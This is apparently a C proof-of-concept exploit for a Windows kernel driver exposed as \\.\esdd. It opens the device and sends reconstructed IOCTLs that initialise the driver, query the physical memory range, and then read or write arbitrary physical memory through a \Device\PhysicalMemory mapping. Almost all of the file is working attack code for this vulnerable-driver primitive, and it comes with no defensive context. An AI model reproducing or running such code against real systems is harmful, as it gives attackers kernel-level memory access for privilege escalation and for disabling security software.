#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

// Reconstructed IOCTL codes based on the masked switch cases
#define IOCTL_ESDD_CONFIG    0x8000C404
#define IOCTL_ESDD_QUERY     0x8000C408
#define IOCTL_ESDD_RW        0x8000C40C

int main() {
    // 1. Open a handle to the esdd device driver
    HANDLE hDevice = CreateFileA(
        "\\\\.\\esdd",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open \\\\.\\esdd handle: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Successfully opened handle to \\\\.\\esdd\n");

    DWORD bytesReturned = 0;

    // ==========================================
    // STEP 2: Configure / Initialize State (Case 0x8000C404)
    // ==========================================
    {
        // Requires at least 4 bytes of input data (MasterIrp->Type)
        DWORD configInput = 1; // Set to 1 to pass the initialization check
        DWORD configOutput = 0;

        BOOL success = DeviceIoControl(
            hDevice,
            IOCTL_ESDD_CONFIG,
            &configInput,
            sizeof(configInput),
            &configOutput,
            sizeof(configOutput),
            &bytesReturned,
            NULL
        );

        if (success) {
            printf("[+] Config IOCTL executed successfully.\n");
        }
    }

    // ==========================================
    // STEP 3: Query Physical Memory Range (Case 0x8000C408)
    // ==========================================
    {
        // Requires input buffer size >= 0x18 (24 bytes)
        unsigned char queryBuffer[24] = { 0 };

        BOOL success = DeviceIoControl(
            hDevice,
            IOCTL_ESDD_QUERY,
            queryBuffer,
            sizeof(queryBuffer),
            queryBuffer,
            sizeof(queryBuffer),
            &bytesReturned,
            NULL
        );

        if (success) {
            printf("[+] Query IOCTL executed successfully. Returned info bytes: %d\n", bytesReturned);
        }
    }

    // ==========================================
    // STEP 4: Perform Physical Memory Read/Write (Case 0x8000C40C)
    // ==========================================
    {
        // Requires input buffer size >= 0x14 (20 bytes)
        // This structure dictates the target physical address offset, size, and direction
        struct {
            ULONGLONG PhysicalAddress; // Offset to read/write in physical space
            ULONG TransferSize;        // Number of bytes
            ULONG Flags;               // Read or write selector
        } rwPayload = { 0 };

        rwPayload.PhysicalAddress = 0x1000; // Example physical address
        rwPayload.TransferSize = 4096;      // 1 page size
        rwPayload.Flags = 0;                // 0 for read, or appropriate flag for write

        unsigned char outputBuffer[4096] = { 0 };

        BOOL success = DeviceIoControl(
            hDevice,
            IOCTL_ESDD_RW,
            &rwPayload,
            sizeof(rwPayload),
            outputBuffer,
            sizeof(outputBuffer),
            &bytesReturned,
            NULL
        );

        if (success) {
            printf("[+] Read/Write IOCTL executed successfully via \\Device\\PhysicalMemory mapping!\n");
        } else {
            printf("[-] IOCTL failed with error: %d\n", GetLastError());
        }
    }

    CloseHandle(hDevice);
    return 0;
}